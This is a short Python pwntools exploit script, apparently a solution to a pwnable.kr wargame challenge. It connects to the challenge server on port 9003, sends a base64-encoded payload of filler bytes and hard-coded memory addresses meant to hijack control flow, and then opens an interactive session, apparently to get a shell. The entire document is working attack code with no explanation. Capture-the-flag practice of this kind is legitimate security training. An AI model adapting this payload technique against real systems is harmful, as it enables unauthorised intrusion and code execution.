from pwn import *
import base64

r = remote ("pwnable.kr", 9003)

r.sendline (base64.b64encode("\xAA\xAA\xAA\xAA\x7f\x92\x04\x08\x40\xeb\x11\x08"))

r.interactive ()
